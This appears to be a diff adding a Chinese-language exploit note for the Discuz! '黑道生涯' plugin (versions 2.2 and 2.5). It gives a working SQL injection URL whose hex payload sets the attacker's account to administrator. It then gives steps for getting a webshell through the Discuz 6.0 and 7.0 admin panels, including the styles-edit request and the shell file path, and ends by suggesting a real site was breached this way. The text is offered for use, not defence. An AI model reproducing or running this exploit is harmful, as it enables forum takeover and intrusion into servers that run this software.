@@ -1,0 +1,22 @@
+
+Discuz!黑道生涯插件注射漏洞
+发布:小强
+
+
+插件版本：2.2  2.5
+
+注册一个论坛ID
+IE提交下面代码
+
+blackband.php?mode=yule&action=enjoy&id=2 and 1=2 union select 1,0x2D312C67726F757069643D312C61646D696E69643D31,3,4/
+
+提升到管理员
+
+discuz7.0.0后台得webshell方法
+http://www.oldjun.com/blog/index.php/archives/48/
+
+如果是discuz6.0 的后台就提交
+admincp.php?action=styles&edit=1
+最后得到的webshell地址还是forumdata/cache/style_1.php
+
+ps:貌似xxbing就是这样日t00ls的？
